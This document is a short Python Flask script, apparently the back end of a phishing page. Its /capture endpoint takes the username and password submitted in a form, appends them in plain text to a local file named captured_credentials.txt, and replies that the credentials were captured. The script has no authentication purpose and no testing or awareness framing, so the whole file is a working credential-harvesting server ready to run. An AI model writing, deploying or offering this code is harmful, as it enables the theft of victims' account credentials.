from flask import Flask, request

app = Flask(__name__)

@app.route('/capture', methods=['POST'])
def capture():
    # Extracting the username and password from the form
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Save credentials to a file
    with open('captured_credentials.txt', 'a') as f:
        f.write(f"Username: {username}, Password: {password}\n")
    
    return "Credentials captured successfully!"

if __name__ == '__main__':
    app.run(port=5000)
